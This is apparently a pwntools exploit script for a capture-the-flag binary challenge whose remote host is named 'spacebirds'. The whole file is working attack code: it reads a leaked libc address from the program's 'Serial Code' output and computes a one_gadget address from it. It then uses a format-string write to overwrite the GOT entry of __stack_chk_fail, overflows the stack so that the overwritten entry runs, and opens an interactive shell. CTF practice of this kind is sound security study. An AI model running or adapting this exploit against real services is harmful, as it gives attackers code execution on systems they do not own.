from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary,checksec=False)
r = ROP(e)
libc = ELF('./libc.so.6',checksec=False)

gs = '''
break *0x400a39
continue
'''


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote("spaceheroes-pwn-spacebirds.chals.io", 443, ssl=True, sni="spaceheroes-pwn-spacebirds.chals.io")
    else:
        return process(e.path)

def one_gadget():
    og_offset = 0xe3b01
    p.recvuntil(b'Serial Code: ')
    leak=int(p.recvline(keepends=False),16)
    libc.address=leak-libc.sym['rand']
    one_gadget = libc.address+og_offset
    log.info("One Gadget: 0x%x" %one_gadget)
    return one_gadget

def format_and_smash(one_gadget):
    payload_writes = {
             e.got['__stack_chk_fail']      : p64(one_gadget)
    }
    chain = fmtstr_payload(6,payload_writes,write_size='short')
    chain = chain.ljust(108,b'\x00')
    p.sendlineafter(b'your area >>>',chain)

p = start()
format_and_smash(one_gadget())
p.interactive()

